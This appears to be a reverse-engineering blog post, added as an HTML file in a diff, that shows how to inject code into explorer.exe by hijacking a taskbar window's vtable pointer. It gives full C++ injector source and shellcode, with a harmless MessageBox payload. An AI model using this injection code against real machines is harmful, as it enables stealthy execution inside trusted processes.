@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?port=1313&amp;mindelay=10&amp;v=2" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Code Injection: Windows Taskbar'><title>Code Injection: Windows Taskbar</title>
+
+<link rel='canonical' href='http://localhost:1313/post/code-injection-mstasklist/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Code Injection: Windows Taskbar'>
+<meta property='og:description' content='Code Injection: Windows Taskbar'>
+<meta property='og:url' content='http://localhost:1313/post/code-injection-mstasklist/'>
+<meta property='og:site_name' content='x0r19x91&#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='reversing' /><meta property='article:tag' content='win32' /><meta property='article:published_time' content='2020-10-06T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-06T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Code Injection: Windows Taskbar">
+<meta name="twitter:description" content="Code Injection: Windows Taskbar">
+    </head>
+    <body class="">
+        <div class="container flex on-phone--column align-items--flex-start extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+
+                
+                    
+                    <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x300_resize_box_2.png" width="300"
+                        height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="http://localhost:1313/">x0r19x91&#39;s blog</a></h1>
+        <h2 class="site-description">My little corner in the web</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="http://localhost:1313/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            
+                <a href="/categories/reversing/">reversing</a>
+            
+        
+            
+                <a href="/categories/win32/">win32</a>
+            
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/post/code-injection-mstasklist/">Code Injection: Windows Taskbar</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        Code Injection: Windows Taskbar
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Oct 06, 2020</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <h2 id="description">Description</h2>
+<p>I will be describing how to inject arbritary code into explorer.exe using the Taskbar.<br>
+I was looking in the taskbar <code>MSTaskListWClass</code>, and I found a valid pointer in the &ldquo;Extra Window Bytes&rdquo; for the &ldquo;Running applications&rdquo; window.</p>
+<p><img src="/images/inject-tasklist/i0.png" alt="i0"  /></p>
+<p>&ldquo;Running applications&rdquo; window is the area just after the start button</p>
+<p><img src="/images/inject-tasklist/i1.png" alt="i1"  /></p>
+<p>I attached x64dbg to explorer.exe, and voila, it&rsquo;s pointing to a COM vtable.</p>
+<p><img src="/images/inject-tasklist/i2.png" alt="i2"  />
+<img src="/images/inject-tasklist/i3.png" alt="i3"  /></p>
+<p>To get a clear view, I opened explorer in ida (with the pdb), and here&rsquo;s the vtable</p>
+<p><img src="/images/inject-tasklist/i4.png" alt="i4"  /></p>
+<p>Xrefs to <code>MSTaskListWClass</code> in ida, gives <code>CTaskListWnd::_RegisterWindowClass(void)</code> and <code>CTaskListWnd::Initialize</code>. It is important to look into <code>_RegisterWindowClass</code> because we want to understand the Window Callback for this class.</p>
+<p><img src="/images/inject-tasklist/i5.png" alt="i5"  /></p>
+<p><img src="/images/inject-tasklist/i6.png" alt="i6"  /></p>
+<p>Here, <code>kernel32!GetWindowLongW</code> returns a pointer to vtable that has three functions - <code>AddRef</code>, <code>Release</code> and <code>WndProc</code>. <code>AddRef</code> is called first, followed by the Window Procedure and <code>Release</code>.</p>
+<p>Now, this vtable is in <code>rdata</code> section. But the pointer to the vtable (the address stored in the extra window bytes), is writeable.</p>
+<p>So, we allocate a rwx page in <code>explorer.exe</code> to store the shellcode and the payload and the new vtable. The new vtable is same as the existing vtable but the <code>Release</code> pointer points to the shellcode.</p>
+<pre><code class="language-x86asm" data-lang="x86asm">mov rax, offset shellcode
+call rax
+mov rax, 0xaabbccddeeff
+jmp rax
+</code></pre><p>Source Code:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;Stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;TlHelp32.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;vector&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#pragma comment(lib, &#34;user32&#34;)
+</span><span style="color:#cd2828;font-weight:bold"></span>
+LPCTSTR <span style="color:#447fcf">pid2name</span>(DWORD dwPid)
+{
+    <span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">char</span> procName[<span style="color:#3677a9">261</span>];
+    HANDLE hSnapshot;
+    PROCESSENTRY32 entry;
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#3677a9">0</span>);
+    <span style="color:#6ab825;font-weight:bold">if</span> (Process32First(hSnapshot, &amp;entry))
+    {
+        <span style="color:#6ab825;font-weight:bold">do</span>
+        {
+            <span style="color:#6ab825;font-weight:bold">if</span> (entry.th32ProcessID == dwPid)
+            {
+                lstrcpy(procName, entry.szExeFile);
+                <span style="color:#6ab825;font-weight:bold">return</span> procName;
+            }
+        }
+        <span style="color:#6ab825;font-weight:bold">while</span> (Process32Next(hSnapshot, &amp;entry));
+    }
+
+    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#ed9d13">&#34;(none)&#34;</span>;
+}
+
+HWND g_hwndMSTaskListWClass;
+
+BOOL WINAPI <span style="color:#447fcf">EnumProc</span>(HWND hWnd, LPARAM lP)
+{
+    <span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">char</span> szClass[<span style="color:#3677a9">128</span>];
+    GetWindowText(hWnd, szClass, <span style="color:#3677a9">127</span>);
+    <span style="color:#6ab825;font-weight:bold">if</span> (!lstrcmp(szClass, <span style="color:#ed9d13">&#34;Running applications&#34;</span>))
+    {
+        g_hwndMSTaskListWClass = hWnd;
+    }
+    <span style="color:#6ab825;font-weight:bold">return</span> TRUE;
+}
+
+<span style="color:#6ab825;font-weight:bold">typedef</span> <span style="color:#6ab825;font-weight:bold">struct</span> {
+    UINT64 pfnAddRef;
+    UINT64 pfnRelease;
+    UINT64 pfnWndProc;
+} CImpWndProc;
+
+<span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>()
+{
+    HWND hw = <span style="color:#24909d">NULL</span>;
+    DWORD dwPid;
+    SIZE_T nRead;
+
+    HWND hwShellTray = FindWindowEx(<span style="color:#24909d">NULL</span>, <span style="color:#24909d">NULL</span>, <span style="color:#ed9d13">&#34;Shell_TrayWnd&#34;</span>, <span style="color:#24909d">NULL</span>);
+    printf(<span style="color:#ed9d13">&#34;[&lt;] ShellTrayWnd: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, hwShellTray);
+
+    EnumChildWindows(hwShellTray, EnumProc, <span style="color:#24909d">NULL</span>);
+
+    printf(<span style="color:#ed9d13">&#34;[*] Running applications: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, g_hwndMSTaskListWClass);
+    GetWindowThreadProcessId(g_hwndMSTaskListWClass, &amp;dwPid);
+    printf(<span style="color:#ed9d13">&#34;[*] ProcessId: %d</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, pid2name(dwPid), dwPid);
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+    printf(<span style="color:#ed9d13">&#34;[*] Handle: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, hProcess);
+
+    <span style="color:#6ab825;font-weight:bold">auto</span> m_windowPtr = GetWindowLongPtr(g_hwndMSTaskListWClass, <span style="color:#3677a9">0</span>);
+    printf(<span style="color:#ed9d13">&#34;[*] VTable Ptr Ptr: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, (PVOID)m_windowPtr);
+
+    CImpWndProc m_vTable {};
+    UINT64 ptrVTable;
+    ReadProcessMemory(hProcess, PVOID(m_windowPtr), &amp;ptrVTable, <span style="color:#6ab825;font-weight:bold">sizeof</span> ptrVTable, &amp;nRead);
+    printf(<span style="color:#ed9d13">&#34;[*] VTable Ptr: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, PVOID(ptrVTable));
+    ReadProcessMemory(hProcess, PVOID(ptrVTable), &amp;m_vTable, <span style="color:#6ab825;font-weight:bold">sizeof</span> m_vTable, &amp;nRead);
+    printf(<span style="color:#ed9d13">&#34;[CImpWndProc.AddRef] -&gt; %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, m_vTable.pfnAddRef);
+    printf(<span style="color:#ed9d13">&#34;[CImpWndProc.Release] -&gt; %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, m_vTable.pfnRelease);
+    printf(<span style="color:#ed9d13">&#34;[CImpWndProc.WndProc] -&gt; %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, m_vTable.pfnWndProc);
+
+    <span style="color:#999;font-style:italic">// shellcode
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#999;font-style:italic">// -------------------------
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#999;font-style:italic">// mov rax, addr of shellcode
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#999;font-style:italic">// call rax
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#999;font-style:italic">// mov rax, old_release_vptr
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#999;font-style:italic">// jmp rax
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#999;font-style:italic">// -------------------------
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">char</span> payload[] = {
+        <span style="color:#3677a9">0x53</span>, <span style="color:#3677a9">0x51</span>, <span style="color:#3677a9">0x52</span>, <span style="color:#3677a9">0x56</span>, <span style="color:#3677a9">0x57</span>, <span style="color:#3677a9">0x55</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x50</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x51</span>,
+        <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x52</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x53</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x54</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x55</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x56</span>,
+        <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x57</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x8B</span>, <span style="color:#3677a9">0x05</span>, <span style="color:#3677a9">0x58</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x48</span>,
+        <span style="color:#3677a9">0xFF</span>, <span style="color:#3677a9">0x05</span>, <span style="color:#3677a9">0x51</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x83</span>, <span style="color:#3677a9">0xF8</span>, <span style="color:#3677a9">0x03</span>,
+        <span style="color:#3677a9">0x7D</span>, <span style="color:#3677a9">0x34</span>, <span style="color:#3677a9">0x33</span>, <span style="color:#3677a9">0xC9</span>, <span style="color:#3677a9">0xE8</span>, <span style="color:#3677a9">0x0D</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x48</span>,
+        <span style="color:#3677a9">0x65</span>, <span style="color:#3677a9">0x6C</span>, <span style="color:#3677a9">0x6C</span>, <span style="color:#3677a9">0x6F</span>, <span style="color:#3677a9">0x20</span>, <span style="color:#3677a9">0x57</span>, <span style="color:#3677a9">0x6F</span>, <span style="color:#3677a9">0x72</span>, <span style="color:#3677a9">0x6C</span>, <span style="color:#3677a9">0x64</span>,
+        <span style="color:#3677a9">0x21</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x5A</span>, <span style="color:#3677a9">0xE8</span>, <span style="color:#3677a9">0x09</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x78</span>, <span style="color:#3677a9">0x30</span>,
+        <span style="color:#3677a9">0x72</span>, <span style="color:#3677a9">0x31</span>, <span style="color:#3677a9">0x39</span>, <span style="color:#3677a9">0x78</span>, <span style="color:#3677a9">0x39</span>, <span style="color:#3677a9">0x31</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x58</span>, <span style="color:#3677a9">0x41</span>,
+        <span style="color:#3677a9">0xB9</span>, <span style="color:#3677a9">0x40</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x48</span>, <span style="color:#3677a9">0x8B</span>, <span style="color:#3677a9">0x05</span>, <span style="color:#3677a9">0x21</span>, <span style="color:#3677a9">0x00</span>,
+        <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0xFF</span>, <span style="color:#3677a9">0xD0</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x5F</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x5E</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x5D</span>,
+        <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x5C</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x5B</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x5A</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x59</span>, <span style="color:#3677a9">0x41</span>, <span style="color:#3677a9">0x58</span>,
+        <span style="color:#3677a9">0x5D</span>, <span style="color:#3677a9">0x5F</span>, <span style="color:#3677a9">0x5E</span>, <span style="color:#3677a9">0x5A</span>, <span style="color:#3677a9">0x59</span>, <span style="color:#3677a9">0x5B</span>, <span style="color:#3677a9">0xC3</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>,
+        <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0xE0</span>, <span style="color:#3677a9">0x2C</span>, <span style="color:#3677a9">0x0B</span>, <span style="color:#3677a9">0xD3</span>, <span style="color:#3677a9">0xF9</span>,
+        <span style="color:#3677a9">0x7F</span>, <span style="color:#3677a9">0x00</span>, <span style="color:#3677a9">0x00</span>
+    };
+    size_t payloadSize = <span style="color:#6ab825;font-weight:bold">sizeof</span> payload;
+
+    <span style="color:#6ab825;font-weight:bold">auto</span> vTableMem = (UINT64) VirtualAllocEx(
+        hProcess, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">32</span>,
+        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE
+    );
+    printf(<span style="color:#ed9d13">&#34;New VTable: %p</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, vTableMem);
+    <span style="color:#6ab825;font-weight:bold">auto</span> vMem = (UINT64) VirtualAllocEx(
+        hProcess, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">4096</span>,
+        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE
+    );
+    WriteProcessMemory(hProcess, PVOID(vMem), payload, payloadSize, &amp;nRead);
+
+    printf(<span style="color:#ed9d13">&#34;[*] Payload Addr: %#016lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, vMem);
+
+    std::vector&lt;<span style="color:#6ab825;font-weight:bold">uint8_t</span>&gt; shellcode;
+
+    <span style="color:#999;font-style:italic">// mov rax, vMem
+</span><span style="color:#999;font-style:italic"></span>    shellcode.push_back(<span style="color:#6ab825;font-weight:bold">uint8_t</span>(<span style="color:#3677a9">0x48</span>));
+    shellcode.push_back(<span style="color:#6ab825;font-weight:bold">uint8_t</span>(<span style="color:#3677a9">0xb8</span>));
+
+    <span style="color:#6ab825;font-weight:bold">for</span> (<span style="color:#6ab825;font-weight:bold">int</span> i = <span style="color:#3677a9">0</span>; i &lt; <span style="color:#3677a9">8</span>; i++)
+        shellcode.push_back(<span style="color:#6ab825;font-weight:bold">uint8_t</span>(vMem &gt;&gt; i*<span style="color:#3677a9">8</span> &amp; <span style="color:#3677a9">0xff</span>));
+
+    <span style="color:#999;font-style:italic">// call rax
+</span><span style="color:#999;font-style:italic"></span>    shellcode.push_back(<span style="color:#6ab825;font-weight:bold">uint8_t</span>(<span style="color:#3677a9">0xff</span>));
+    shellcode.push_back(<span style="color:#6ab825;font-weight:bold">uint8_t</span>(<span style="color:#3677a9">0xd0</span>));
+
+    <span style="color:#999;font-style:italic">// mov rax, old_release
+</span><span style="color:#999;font-style:italic"></span>    shellcode.push_back(<span style="color:#6ab825;font-weight:bold">uint8_t</span>(<span style="color:#3677a9">0x48</span>));
+    shellcode.push_back(<span style="color:#6ab825;font-weight:bold">uint8_t</span>(<span style="color:#3677a9">0xb8</span>));
+
+    <span style="color:#6ab825;font-weight:bold">for</span> (<span style="color:#6ab825;font-weight:bold">int</span> i = <span style="color:#3677a9">0</span>; i &lt; <span style="color:#3677a9">8</span>; i++)
+        shellcode.push_back(<span style="color:#6ab825;font-weight:bold">uint8_t</span>(m_vTable.pfnRelease &gt;&gt; i*<span style="color:#3677a9">8</span> &amp; <span style="color:#3677a9">0xff</span>));
+
+    <span style="color:#999;font-style:italic">// jmp rax
+</span><span style="color:#999;font-style:italic"></span>    shellcode.push_back(<span style="color:#6ab825;font-weight:bold">uint8_t</span>(<span style="color:#3677a9">0xff</span>));
+    shellcode.push_back(<span style="color:#6ab825;font-weight:bold">uint8_t</span>(<span style="color:#3677a9">0xe0</span>));
+
+    printf(<span style="color:#ed9d13">&#34;Press Enter To Exploit!</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+    <span style="color:#6ab825;font-weight:bold">char</span> sc;
+    sc = getchar();
+
+    <span style="color:#6ab825;font-weight:bold">auto</span> shellcodeAddr = vMem + payloadSize + <span style="color:#3677a9">15</span> &amp; -<span style="color:#3677a9">16</span>;
+    m_vTable.pfnRelease = shellcodeAddr;
+    printf(<span style="color:#ed9d13">&#34;[*] Shellcode Addr: %#016lx</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, shellcodeAddr);
+    WriteProcessMemory(hProcess, PVOID(shellcodeAddr), shellcode.data(), shellcode.size(), &amp;nRead);
+    WriteProcessMemory(hProcess, PVOID(vTableMem), &amp;m_vTable, <span style="color:#6ab825;font-weight:bold">sizeof</span> m_vTable, &amp;nRead);
+    WriteProcessMemory(hProcess, PVOID(m_windowPtr), &amp;vTableMem, <span style="color:#6ab825;font-weight:bold">sizeof</span> vTableMem, &amp;nRead);
+
+    CloseHandle(hProcess);
+}
+</code></pre></div><p>The Payload:</p>
+<pre><code class="language-x86asm" data-lang="x86asm">.code
+
+main:
+    push rbx
+    push rcx
+    push rdx
+    push rsi
+    push rdi
+    push rbp
+    push r8
+    push r9
+    push r10
+    push r11
+    push r12
+    push r13
+    push r14
+    push r15
+    mov rax, [count]
+    inc qword ptr [count]
+    cmp rax, 3
+    jge bye
+    xor ecx, ecx
+    call next
+    db &quot;Hello World!&quot;, 0
+
+next:
+    pop rdx
+    call fuck
+    db &quot;x0r19x91&quot;, 0
+
+fuck:
+    pop r8
+    mov r9d, 040h
+    mov rax, [fnMessageBoxA]
+    call rax
+
+bye:
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop r11
+    pop r10
+    pop r9
+    pop r8
+    pop rbp
+    pop rdi
+    pop rsi
+    pop rdx
+    pop rcx
+    pop rbx
+    ret
+
+   count dq 0
+   fnMessageBoxA dq 00007FF9D30B2CE0h   ; hardcoded, just for poc, will resolve dynamically later
+
+end
+</code></pre><h2 id="output">Output</h2>
+<p><img src="/images/inject-tasklist/exp.png" alt="exp"  /></p>
+<h2 id="inspiration">Inspiration</h2>
+<ul>
+<li><a class="link" href="https://modexp.wordpress.com/2019/08/10/windows-process-injection-tooltip-controls/"  target="_blank" rel="noopener"
+    >modexp&rsquo;s awesome blog</a></li>
+</ul>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/reversing/">reversing</a>
+        
+            <a href="/tags/win32/">win32</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+    integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
+    integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4"
+    crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+    integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
+    onload="renderMathInElement(document.querySelector(`.article-content`));"></script>
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/post/google-ctf-2020-.net/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Google CTF 2020 - .NET</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/analysing-jigsaw-ransomware/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Analysing Jigsaw Ransomware</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/eset-crackme-challenge/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ESET Crackme Challenge</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/deobfuscating-movfuscator-part-2/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Deobfuscating MoVfuscator - Part 2</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/understanding-the-movfuscator/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Understanding the Movfuscator</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">&copy; 2020 x0r19x91&#39;s blog</section>
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="1.1.0">Stack</a></b> designed by
+        <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true" style="display:none">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
